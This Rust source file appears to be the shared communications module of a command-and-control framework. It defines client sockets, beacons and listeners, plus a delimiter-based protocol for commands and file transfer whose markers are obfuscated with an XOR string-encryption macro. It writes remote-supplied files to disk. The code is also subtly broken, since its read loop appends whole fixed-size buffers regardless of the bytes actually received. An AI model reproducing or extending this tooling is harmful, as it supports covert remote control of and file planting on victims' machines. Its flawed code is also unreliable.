use std::sync::Arc;

use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
};

use xorcrypt::{e, prepare_encryption};
prepare_encryption!();

pub struct Client {
    pub socket: TcpStream,
    pub addr: String,
}
pub async fn download_file(data: &[u8]) {
    let start_seq = e!("::STARTFILE::");
    let start_seq = start_seq.as_bytes();
    let start_data = e!("::STARTDATA::");
    let start_data = start_data.as_bytes();
    let stop_seq = e!("::ENDFILE::");
    let stop_seq = stop_seq.as_bytes();

    let filename = String::from_utf8(find_between(start_seq, start_data, data).await).unwrap();
    let filedata = find_between(start_data, stop_seq, data).await;

    tokio::fs::write(filename, filedata).await.unwrap();
}
impl Client {
    pub async fn read(&mut self) -> std::io::Result<Vec<u8>> {
        let mut read_buf: Vec<u8> = vec![];
        let termination = e!("::OVER::");
        let termination = termination.as_bytes();
        while !substr_exists(&read_buf, termination).await {
            let mut buf = vec![0u8; 4096 * 4096];
            match self.socket.read(&mut buf).await {
                Ok(_) => read_buf.append(&mut buf),
                Err(e) => return Err(e),
            }
        }

        if let Some(position) = find_position(&read_buf, termination).await {
            read_buf = read_buf[..position].to_vec();
        }
        Ok(read_buf)
    }

    pub async fn write(&mut self, data: &[u8]) -> std::io::Result<()> {
        let mut data = data.to_vec();
        data.append(&mut e!("::OVER::").as_bytes().to_vec());
        self.socket.write_all(data.as_slice()).await
    }

    pub async fn write_file(&mut self, data: Vec<u8>, filename: &[u8]) -> std::io::Result<()> {
        let mut start_seq = e!("::STARTFILE::").as_bytes().to_vec();
        let mut start_data = e!("::STARTDATA::").as_bytes().to_vec();
        let mut stop_seq = e!("::ENDFILE::").as_bytes().to_vec();

        let mut file_data: Vec<u8> = vec![];

        file_data.append(&mut start_seq);
        file_data.append(&mut filename.to_vec());
        file_data.append(&mut start_data);
        file_data.append(&mut data.to_vec());
        file_data.append(&mut stop_seq);
        file_data.append(&mut e!("::OVER::").as_bytes().to_vec());

        self.socket.write_all(file_data.as_slice()).await
    }
}

async fn find_position(buf: &[u8], needle: &[u8]) -> Option<usize> {
    buf.windows(needle.len()).position(|x| x == needle)
}

pub async fn substr_exists(buf: &[u8], needle: &[u8]) -> bool {
    find_position(buf, needle).await.is_some()
}

async fn find_between(start_seq: &[u8], stop_seq: &[u8], buf: &[u8]) -> Vec<u8> {
    let start_index = buf
        .windows(start_seq.len())
        .position(|x| x == start_seq)
        .unwrap();
    let stop_index = buf
        .windows(stop_seq.len())
        .position(|x| x == stop_seq)
        .unwrap();
    buf[start_index + start_seq.len()..stop_index].to_vec()
}

pub struct Beacon {
    pub ip: String,
    pub port: String,
    pub file_path: String,
}

#[derive(Clone)]
pub struct ClientList {
    pub clients: Arc<Mutex<Vec<Client>>>,
    pub beacons: Arc<Mutex<Vec<Beacon>>>,
    pub listeners: Arc<Mutex<Vec<String>>>,
}
